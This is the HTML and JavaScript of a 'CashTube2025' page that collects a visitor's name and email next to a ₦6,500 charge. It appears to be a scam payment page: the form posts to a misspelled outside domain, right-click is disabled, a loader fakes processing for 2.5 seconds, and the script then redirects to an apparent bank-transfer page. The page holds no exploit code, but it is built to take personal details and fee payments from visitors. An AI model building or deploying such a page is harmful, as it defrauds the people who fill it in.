<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Fill Details · Cash Tube2025</title>
  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: #f0f2f8;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0;
    }

    /* Top Header */
    .top-header {
      width: 100%;
      max-width: 480px;
      background: linear-gradient(145deg, #1e1b4b, #312e81);
      padding: 30px 24px 20px;
      border-radius: 0 0 32px 32px;
      color: white;
      box-shadow: 0 8px 24px rgba(30, 27, 75, 0.2);
    }

    .top-header .logo-area {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 4px;
    }

    .top-header .logo-icon {
      width: 44px;
      height: 44px;
      background: rgba(255, 255, 255, 0.15);
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
    }

    .top-header h1 {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.5px;
    }

    .top-header .sub {
      font-size: 14px;
      opacity: 0.8;
      margin-top: 2px;
    }

    /* Back button */
    .back-link {
      width: 100%;
      max-width: 480px;
      padding: 16px 24px 0;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .back-link a {
      color: #4b5563;
      text-decoration: none;
      font-weight: 600;
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: 0.2s;
    }

    .back-link a:hover {
      color: #7c3aed;
    }

    /* Main Card */
    .main-card {
      width: 100%;
      max-width: 480px;
      margin: 20px 16px 30px;
      background: #ffffff;
      border-radius: 32px;
      padding: 28px 24px 32px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.06), 0 8px 20px rgba(0, 0, 0, 0.03);
      border: 1px solid rgba(255, 255, 255, 0.6);
    }

    .main-card .icon-top {
      text-align: center;
      margin-bottom: 12px;
    }

    .main-card .icon-top i {
      font-size: 40px;
      color: #7c3aed;
      background: #ede9fe;
      padding: 14px;
      border-radius: 50%;
    }

    .main-card h2 {
      font-size: 22px;
      font-weight: 700;
      color: #0f172a;
      text-align: center;
      margin-bottom: 4px;
    }

    .main-card .subtitle {
      text-align: center;
      color: #64748b;
      font-size: 14px;
      margin-bottom: 24px;
    }

    /* Form */
    .form-group {
      margin-bottom: 18px;
    }

    .form-group label {
      display: block;
      font-weight: 600;
      font-size: 14px;
      color: #1e293b;
      margin-bottom: 6px;
    }

    .form-group label i {
      color: #7c3aed;
      width: 20px;
    }

    .form-group input {
      width: 100%;
      padding: 14px 16px;
      border: 2px solid #e2e8f0;
      border-radius: 16px;
      font-size: 15px;
      transition: 0.2s;
      background: #f8fafc;
      outline: none;
    }

    .form-group input:focus {
      border-color: #7c3aed;
      background: #ffffff;
      box-shadow: 0 0 0 4px rgba(124, 58, 237, 0.1);
    }

    .form-group input:disabled {
      background: #f1f5f9;
      color: #1e293b;
      font-weight: 600;
      cursor: not-allowed;
    }

    .form-group .amount-display {
      background: #f1f5f9;
      border: 2px solid #e2e8f0;
      border-radius: 16px;
      padding: 14px 16px;
      font-size: 18px;
      font-weight: 700;
      color: #0f172a;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .form-group .amount-display span {
      color: #7c3aed;
    }

    .form-group .amount-display i {
      color: #22c55e;
      font-size: 20px;
    }

    .btn-submit {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 16px;
      background: linear-gradient(145deg, #7c3aed, #5b21b6);
      color: white;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.2s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-top: 8px;
      box-shadow: 0 8px 20px -6px rgba(91, 33, 182, 0.3);
    }

    .btn-submit:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 28px -8px rgba(91, 33, 182, 0.4);
    }

    .btn-submit:active {
      transform: scale(0.97);
    }

    .btn-submit:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: none;
    }

    /* Bottom wave image */
    .wave-img {
      width: 100%;
      margin-top: 16px;
      border-radius: 12px;
      overflow: hidden;
    }

    .wave-img img {
      width: 100%;
      display: block;
      border-radius: 12px;
    }

    /* Loader */
    .loader-container {
      display: none;
      justify-content: center;
      align-items: center;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(4px);
      z-index: 9999;
    }

    .loader-box {
      background: white;
      padding: 32px 40px;
      border-radius: 24px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
    }

    .loader-box .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #7c3aed;
      border-radius: 50%;
      width: 48px;
      height: 48px;
      animation: spin 0.6s linear infinite;
      margin: 0 auto 12px;
    }

    .loader-box p {
      color: #475569;
      font-weight: 500;
      font-size: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Bottom Menu */
    .bottom-menu {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      background: rgba(255, 255, 255, 0.92);
      backdrop-filter: blur(16px);
      -webkit-backdrop-filter: blur(16px);
      border-top: 1px solid rgba(0, 0, 0, 0.05);
      display: flex;
      justify-content: space-around;
      align-items: center;
      padding: 12px 10px 16px;
      z-index: 999;
    }

    .bottom-menu a {
      display: flex;
      flex-direction: column;
      align-items: center;
      color: #94a3b8;
      text-decoration: none;
      font-size: 11px;
      font-weight: 600;
      gap: 2px;
      transition: 0.2s;
    }

    .bottom-menu a i {
      font-size: 20px;
    }

    .bottom-menu a.active {
      color: #7c3aed;
    }

    .bottom-menu a.active i {
      background: #ede9fe;
      padding: 6px 14px;
      border-radius: 30px;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .top-header {
        padding: 24px 18px 16px;
      }
      .top-header h1 {
        font-size: 18px;
      }
      .main-card {
        padding: 22px 16px 26px;
        margin: 12px 12px 20px;
      }
      .form-group input {
        padding: 12px 14px;
        font-size: 14px;
      }
      .btn-submit {
        padding: 14px;
        font-size: 15px;
      }
      .loader-box {
        padding: 24px 28px;
      }
    }
  </style>
</head>
<body>

  <!-- Back Link -->
  <div class="back-link">
    <a href="index.html"><i class="fas fa-arrow-left"></i> Back to Login</a>
  </div>

  <!-- Top Header -->
  <div class="top-header">
    <div class="logo-area">
      <div class="logo-icon"><i class="fas fa-bolt"></i></div>
      <div>
        <h1>CashTube2025</h1>
        <div class="sub">Complete your details to proceed</div>
      </div>
    </div>
  </div>

  <!-- Main Card -->
  <div class="main-card">
    <div class="icon-top">
      <i class="fas fa-edit"></i>
    </div>
    <h2>Fill Your Details</h2>
    <p class="subtitle">Please provide the information below to continue</p>

    <form id="paymentForm" action="https://allappsreveiws.com.ng/flupayment/next_page.html" method="get">
      <div class="form-group">
        <label><i class="fas fa-naira-sign"></i> Amount</label>
        <div class="amount-display">
          <span>₦6,500</span>
          <i class="fas fa-check-circle"></i>
        </div>
      </div>

      <div class="form-group">
        <label for="fullName"><i class="fas fa-user"></i> Full Name</label>
        <input type="text" id="fullName" name="fullName" placeholder="Your full name" required>
      </div>

      <div class="form-group">
        <label for="email"><i class="fas fa-envelope"></i> Your Email Address</label>
        <input type="email" id="email" name="email" placeholder="email address" required>
      </div>

      <button type="button" id="payButton" class="btn-submit">
        <i class="fas fa-arrow-right"></i> Proceed
      </button>

      <div class="wave-img">
        <img src="img/wav.jpg" alt="">
      </div>
    </form>
  </div>

  <!-- Loader Container -->
  <div class="loader-container" id="loaderContainer">
    <div class="loader-box">
      <div class="loader"></div>
      <p>Processing your request...</p>
    </div>
  </div>

  <!-- Bottom Menu -->
  <div class="bottom-menu">
    <a href="index.html"><i class="fas fa-home"></i><span>Home</span></a>
    <a href="about.html"><i class="fas fa-info-circle"></i><span>About</span></a>
    <a href="contact.html" class="active"><i class="fas fa-envelope"></i><span>Contact</span></a>
  </div>

  <script>
    // Disable right-click
    document.addEventListener('contextmenu', function(event) {
      event.preventDefault();
    });

    const paymentForm = document.getElementById('paymentForm');
    const payButton = document.getElementById('payButton');
    const loaderContainer = document.getElementById('loaderContainer');
    const fullNameInput = document.getElementById('fullName');
    const emailInput = document.getElementById('email');

    payButton.addEventListener('click', function() {
      const fullName = fullNameInput.value.trim();
      const email = emailInput.value.trim();

      // Validate fields
      if (!fullName || !email) {
        alert('Please fill in all fields.');
        return;
      }

      // Validate email format
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailPattern.test(email)) {
        alert('Please enter a valid email address.');
        return;
      }

      // Show loader
      loaderContainer.style.display = 'flex';

      // Disable form elements
      payButton.disabled = true;
      fullNameInput.disabled = true;
      emailInput.disabled = true;

      // Simulate loading for 2.5 seconds (matches original behavior)
      setTimeout(function() {
        // Enable form elements
        payButton.disabled = false;
        fullNameInput.disabled = false;
        emailInput.disabled = false;

        // Hide loader
        loaderContainer.style.display = 'none';

        // Redirect to banktf.html with form data as query parameters
        const queryParams = '?fullName=' + encodeURIComponent(fullName) + '&email=' + encodeURIComponent(email);
        window.location.href = 'banktf.html' + queryParams;
      }, 2500);
    });

    // Allow Enter key to submit
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active === fullNameInput || active === emailInput) {
          payButton.click();
        }
      }
    });
  </script>

</body>
</html>
